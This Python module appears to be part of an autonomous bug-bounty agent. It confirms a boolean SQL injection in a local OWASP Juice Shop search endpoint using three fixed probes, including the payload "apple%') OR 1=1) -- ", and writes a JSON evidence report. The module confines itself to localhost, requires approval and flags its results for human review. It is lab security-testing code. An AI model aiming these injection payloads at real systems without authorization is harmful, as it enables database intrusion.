"""R9.17D: bounded autonomous investigation of local Juice Shop."""

import hashlib
import http.client
import json
import os
import re
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import urlencode

from core.bounty_agent.autonomy.local_lab_r917 import LabBoundaryError

HOST = "127.0.0.1"
PORT = 3000
ENDPOINT = "/rest/products/search"
MAX_BODY = 65536

# Fixed, read-only lab probes. No arbitrary payload generation.
PROBES = (
    ("baseline", "apple"),
    ("boolean_true", "apple%') OR 1=1) -- "),
    ("boolean_false", "apple%') OR 1=0) -- "),
)


def request_probe(query):
    connection = http.client.HTTPConnection(HOST, PORT, timeout=5)

    try:
        connection.connect()
        if connection.sock.getpeername() != (HOST, PORT):
            raise LabBoundaryError("Unexpected network peer")

        path = ENDPOINT + "?" + urlencode({"q": query})
        connection.request(
            "GET", path, headers={"Connection": "close"}
        )

        response = connection.getresponse()
        status = response.status

        if 300 <= status < 400:
            raise LabBoundaryError("Redirect rejected")

        body = response.read(MAX_BODY + 1)
        if len(body) > MAX_BODY:
            raise LabBoundaryError("Response too large")

        try:
            payload = json.loads(body)
        except (ValueError, UnicodeDecodeError):
            payload = None

        products = (
            payload.get("data")
            if isinstance(payload, dict)
            else None
        )

        valid_products = (
            status == 200
            and isinstance(payload, dict)
            and payload.get("status") == "success"
            and isinstance(products, list)
            and all(
                isinstance(item, dict)
                and isinstance(item.get("id"), int)
                for item in products
            )
        )

        ids = (
            sorted({item["id"] for item in products})
            if valid_products else []
        )

        error_text = body.decode("utf-8", errors="replace")
        sqlite_error = (
            re.search(r"SQLITE_ERROR:\s*([^<\n]+)", error_text)
            if status >= 400 else None
        )

        return {
            "http_status": status,
            "body_sha256": hashlib.sha256(body).hexdigest(),
            "product_ids": ids,
            "product_count": len(products) if valid_products else None,
            "valid_product_response": valid_products,
            "sqlite_error": (
                sqlite_error.group(1).strip()[:200]
                if sqlite_error else None
            ),
        }

    except (OSError, http.client.HTTPException) as exc:
        raise LabBoundaryError("Lab request failed") from exc
    finally:
        connection.close()


def investigate(*, evidence_dir, approved=False):
    if approved is not True:
        raise LabBoundaryError("Explicit local lab approval required")

    output = Path(evidence_dir)
    if not output.is_dir() or output.is_symlink():
        raise LabBoundaryError("Invalid evidence directory")

    observations = {}

    for label, query in PROBES:
        observations[label] = request_probe(query)

    baseline = observations["baseline"]
    true_case = observations["boolean_true"]
    false_case = observations["boolean_false"]

    valid = all(
        item["valid_product_response"]
        for item in observations.values()
    )

    baseline_ids = set(baseline["product_ids"])
    true_ids = set(true_case["product_ids"])
    false_ids = set(false_case["product_ids"])

    demonstrated = (
        valid
        and bool(baseline_ids)
        and baseline_ids.issubset(true_ids)
        and len(true_ids - baseline_ids) > 0
        and false_ids == baseline_ids
    )

    if demonstrated:
        classification = "validated_local_lab"
        reason = (
            "True-condition response includes additional product IDs; "
            "false-condition response matches the baseline."
        )
    elif any(
        item["sqlite_error"]
        for item in observations.values()
    ):
        classification = "inconclusive_sql_error"
        reason = "SQL errors occurred without sufficient behavioral proof."
    else:
        classification = "inconclusive"
        reason = "Responses did not satisfy the verification criteria."

    report = {
        "schema": "jarvis.bounty.lab_investigation.r917d3",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target": f"http://{HOST}:{PORT}{ENDPOINT}",
        "authorization": {
            "scope": "localhost_fixed_three_probe_lab",
            "caller_approved": True,
            "independently_authenticated": False,
        },
        "request_count": len(PROBES),
        "observations": observations,
        "classification": classification,
        "reason": reason,
        "validated_local_lab": demonstrated,
        "human_review_required": True,
        "submission_authorized": False,
    }

    encoded = json.dumps(
        report, sort_keys=True, indent=2
    ).encode("utf-8")
    digest = hashlib.sha256(encoded).hexdigest()
    path = output / f"investigation-{digest[:16]}.json"

    try:
        fd = os.open(
            path,
            os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW,
            0o600,
        )
    except FileExistsError as exc:
        raise LabBoundaryError("Evidence collision") from exc

    with os.fdopen(fd, "wb") as handle:
        handle.write(encoded)

    return {
        "classification": classification,
        "reason": reason,
        "validated_local_lab": demonstrated,
        "evidence_path": str(path),
        "sha256": digest,
        "request_count": len(PROBES),
        "observations": observations,
    }
